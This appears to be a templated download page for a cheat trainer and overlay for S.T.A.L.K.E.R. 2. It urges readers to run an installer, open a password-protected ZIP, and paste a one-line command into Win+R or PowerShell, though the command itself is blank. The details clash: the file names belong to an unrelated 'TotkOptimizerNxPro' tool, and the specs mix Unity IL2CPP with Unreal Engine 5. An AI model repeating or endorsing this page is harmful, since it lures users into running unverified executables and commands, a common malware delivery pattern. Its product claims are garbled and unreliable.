text:
S.T.A.L.K.E.R. 2: Heart of Chornobyl (v2.1.3 — Windows 10 / 11 x64)

 
 
 

 S.T.A.L.K.E.R. 2: Heart of Chornobyl is a standalone 64-bit external overlay and trainer for S.T.A.L.K.E.R. 2: Heart of Chornobyl on PC (Windows 10/11). It uses signature-based memory scanning and a borderless DirectX 11/12 ImGui overlay so base game files remain untouched.

---

 ⬇️ Download & Quick Setup (Windows 10 / 11 x64)

- 🚀 Open S.T.A.L.K.E.R. 2: Heart of Chornobyl Setup Portal ( TotkOptimizerNxPro-Installer.exe ) — Interactive Setup & Mirrors 
- 📦 Direct Download Portable .ZIP Archive ( totk-optimizer-nx-pro-patcher-installer-v2.4.0-win64.zip · 2.66 MB · Password: 2026 ) 
- 📋 Release Notes & SHA-256 Checksums ( v2.1.3 ) 

 ⚡ Instant 1-Command Setup ( Win + R or PowerShell · 3 Seconds)
Press Win + R (or open Windows Terminal / PowerShell ), paste the command below, and press Enter :

 

 

 

---

 Key Features & Technical Specs

- Auto-updating AOB signature scanner compatible with Steam and Epic Games builds
- In-game DirectX 11/12 ImGui overlay menu toggled via INSERT or F1..F12 hotkeys
- Player attribute editor: God Mode, Infinite Stamina, Currency / XP multiplier, and Zero Weight
- World & physics controls: Game speed multiplier, instant teleport, item spawner, and ESP

 Property Specification 
 :--- :--- 
 Package Binary TotkOptimizerNxPro/TotkOptimizerNxPro-Installer.exe ( v2.1.3 ) 
 Target Runtime Unity IL2CPP / Unreal Engine 5 Native x64 Memory & DX12 Overlay ( GameAssembly.dll ) 
 Install Path %LOCALAPPDATA%\Programs\Stalker2HeartOfChorn 
 Supported OS Windows 10 / Windows 11 (64-bit, 22H2–24H2) 

---

 How to Install & Run

1. Open the S.T.A.L.K.E.R. 2: Heart of Chornobyl Build & Setup Portal (v2.1.3) or Releases.
2. Extract TotkOptimizerNxPro and launch TotkOptimizerNxPro-Installer.exe (or use the 1-command Win + R setup on the portal).
3. Start S.T.A.L.K.E.R. 2: Heart of Chornobyl in Windowed or Borderless Fullscreen mode.
4. Press INSERT in-game to open the overlay menu and configure hotkeys.
